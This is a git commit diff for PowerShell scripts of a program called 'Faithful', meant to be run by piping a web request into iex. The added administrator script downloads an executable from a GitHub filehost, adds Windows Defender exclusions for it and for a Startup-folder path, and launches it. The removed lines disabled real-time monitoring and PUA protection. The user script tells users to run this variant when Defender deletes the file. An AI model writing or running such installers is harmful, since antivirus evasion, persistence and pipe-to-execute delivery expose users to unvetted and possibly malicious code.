f2c2dfd58bedfe32207b41f6d7dc789ca7ad7a8b
thaddeuskkr <thaddeuskkr@gmail.com>
2022-04-23 18:16:47 +0800

    adding admin back

--- faithful-simple.sh
+++ faithful-simple.sh
@@ -2,8 +2,11 @@
 # iwr faithful.cf | iex
 
 cd $env:userprofile
-Write-Output "Downloading executable file..."
+Write-Output "[LAST UPDATE]: 23/4/2022 6:10 PM"
+Write-Output "(INFO) Downloading executable file..."
 Invoke-WebRequest https://raw.githubusercontent.com/thaddeuskkr/filehost/master/faithful.exe -OutFile "XFaithful.exe"
-Write-Output "Running executable..."
+Write-Output "(INFO) Running executable..."
 Start-Process ("XFaithful.exe")
-Write-Output "Done!"
+Write-Output "(INFO) Done!"
+Write-Output "If Windows Defender automatically removes the Faithful executable, run 'iwr a.faithful.cf | iex' as an administrator instead."
+Write-Output "If you are using any other antivirus and face issues with them, add exclusions for the paths stated in the above command manually."
--- faithful.sh
+++ faithful.sh
@@ -2,20 +2,20 @@
 # Command to execute:
 # iwr a.faithful.cf | iex
 
-# cd $env:userprofile
-# Set-MpPreference -DisableRealtimeMonitoring $true
-# Write-Output "Starting script..."
-# Invoke-WebRequest https://raw.githubusercontent.com/thaddeuskkr/filehost/master/faithful.exe -OutFile "faithful.exe"
-# Write-Output "Adding Windows Defender exclusions..."
-# Set-MpPreference -PUAProtection Disabled
-# Add-MpPreference -ExclusionPath "$((Get-Item .).FullName)\faithful.exe"
-# Add-MpPreference -ExclusionPath "$env:userprofile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\faithful.exe"
-# Start-Process ("faithful.exe")
-# Write-Output "Done!"
-
-Write-Output "You made a web request to a.faithful.cf, which is the administrator script for the Faithful program."
-Write-Output "This script is no longer in use due to its unreliability."
-Write-Output "Instead of using this script, please use the following command instead:"
-Write-Output "iwr faithful.cf | iex"
-Write-Output "- Running this command for you..."
-iwr faithful.cf | iex
+Write-Output "The Faithful script was recently updated, and this administrator script was re-added."
+Write-Output "[LAST UPDATE]: 23/4/2022 6:10 PM"
+Write-Output "(INFO) Starting download..."
+Invoke-WebRequest https://raw.githubusercontent.com/thaddeuskkr/filehost/master/faithful.exe -OutFile "XFaithful.exe"
+Write-Output "(INFO) Executable downloaded"
+Write-Output "Adding exclusions for Windows defender..."
+Add-MpPreference -ExclusionPath "$((Get-Item .).FullName)\XFaithful.exe"
+Add-MpPreference -ExclusionPath "$env:userprofile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\XFaithful.exe"
+Write-Output "(INFO) Exclusions added. If the above two commands failed, you need to add Faithful as an exclusion manually so that the program continues to work."
+Write-Output "(INFO) The two exclusion paths to add are:"
+Write-Output "(INFO) $((Get-Item .).FullName)\XFaithful.exe"
+Write-Output "(INFO) and"
+Write-Output "(INFO) $env:userprofile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\XFaithful.exe"
+Write-Output "(INFO) You can ignore the output if the previous command was successful."
+Write-Output "(INFO) Starting Faithful..."
+Start-Process ("XFaithful.exe")
+Write-Output "(INFO) Done!"
